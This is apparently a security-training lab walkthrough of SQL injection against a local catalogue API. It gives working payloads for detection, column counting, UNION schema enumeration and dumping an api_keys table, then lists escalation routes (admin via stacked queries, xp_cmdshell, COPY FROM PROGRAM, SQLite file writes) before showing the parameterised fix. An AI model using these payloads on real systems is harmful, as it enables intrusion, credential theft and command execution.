# Lab 12 — Catalogue

## Step 1 — prove the parameter reaches SQL

One quote.

```bash
h5i browser open 'http://127.0.0.1:9120/api/products?q=compass' --session lab12 --new --capture
h5i websec replay req_0 --session lab12 --set "query.q=compass'"
h5i websec show res_1 --session lab12 --raw
```

```json
{"error":"unrecognized token: \"'%'\"","sql":"SELECT id, name, price FROM products WHERE name LIKE '%compass'%'"}
```

The server printed its own query. That will not happen on a real target; what
*will* happen is a 500 where a 200 was, and that alone is the signal.

The disciplined version of this step is a triple, because a single quote can
break things for reasons unrelated to SQL:

| Payload | Expected if injectable |
| --- | --- |
| `compass'` | error / different response |
| `compass''` | back to normal — the quote was escaped by another quote |
| `compass' AND '1'='1` | same results as `compass` |
| `compass' AND '1'='2` | no results |

The last two are the real proof: you changed the *logic*, not just the syntax.

## Step 2 — count the columns

A `UNION` demands that both sides have the same number of columns. Find it with
`ORDER BY`, which fails loudly when you overshoot:

```bash
for n in 1 2 3 4 5; do
  printf '%d ' $n
  h5i websec replay req_0 --session lab12 --reset-budget \
      --set "query.q=zz%' ORDER BY $n -- " |
    python3 -c 'import json,sys;print(json.load(sys.stdin)["response"]["status"])'
done
```

    1 200   2 200   3 200   4 500

Three columns. (You could also have counted the fields in the JSON response —
`id`, `name`, `price` — which is usually faster and is why reading the *normal*
response first is worth the minute.)

## Step 3 — find the table

SQLite keeps its catalogue in `sqlite_master`; every engine has an equivalent.

```bash
h5i websec replay req_0 --session lab12 \
  --set "query.q=zz%' UNION SELECT 1, name, 0 FROM sqlite_master WHERE type='table' -- "
```

| Engine | Where the schema lives |
| --- | --- |
| SQLite | `sqlite_master(name, sql)` |
| MySQL / MariaDB | `information_schema.tables`, `.columns` |
| PostgreSQL | `information_schema.tables`, `pg_catalog.pg_tables` |
| MSSQL | `sys.tables`, `sys.columns`, `information_schema` |
| Oracle | `all_tables`, `all_tab_columns` |

## Step 4 — read it

```bash
h5i websec replay req_0 --session lab12 \
  --set "query.q=zz%' UNION SELECT id, secret, 0 FROM api_keys -- "
```

Two details in that payload that beginners lose an hour to:

* **`zz%'`** — the leading `zz` makes the original `LIKE` match nothing, so the
  only rows in the answer are yours. Injecting into a `LIKE` also means you must
  close the `%` yourself.
* **`-- ` with a trailing space.** MySQL requires whitespace after `--`.
  SQLite and Postgres do not, but the habit costs nothing and the alternative
  (`#` in MySQL, `;%00` in old stacks) costs a round trip.

## Escalation beyond reading

Once you have injection, ask what else the engine offers:

* stacked queries (`; UPDATE users SET is_admin=1 --`) where the driver allows
  more than one statement
* file read/write: MySQL `LOAD_FILE`/`INTO OUTFILE`, Postgres `COPY … FROM
  PROGRAM` (which is command execution), MSSQL `xp_cmdshell`
* SQLite `ATTACH DATABASE '/var/www/x.php' AS x` to write a file

## The fix

Parameterise. Not "escape" — parameterise:

```python
db().execute("SELECT id, name, price FROM products WHERE name LIKE ?", (f"%{q}%",))
```

The query text is then a constant, and no value can ever become syntax. When a
part of the statement genuinely must be dynamic (a sort column, a table name),
map the input through an allowlist to a literal you wrote. And turn off verbose
errors in production — they did not create this bug, but they shortened the
exploit from an afternoon to a minute.

## h5i technique

Nothing new: `--set query.q=` with a payload full of quotes and equals signs.
`--set` takes everything after the *first* `=` as the value, so a payload
containing `=` needs no escaping. That is worth more than it sounds.
